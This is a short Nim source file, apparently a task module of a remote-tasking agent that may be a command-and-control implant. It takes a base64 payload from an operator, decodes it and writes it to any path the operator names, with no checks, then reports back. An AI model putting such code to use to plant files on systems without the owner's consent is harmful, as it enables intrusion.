import std/base64
import ../client/[communication, types]

proc executeTask*(app: App, taskId: int, params: seq[string]) =
  let taskOutput = newTaskOutput taskId

  let fileContents = decode(params[0])
  writeFile(params[1], fileContents)
  
  taskOutput.addData(Text, "result", "received file " & params[1] & " (length: " & $len(fileContents) & ")")
  app.sendOutput(taskOutput)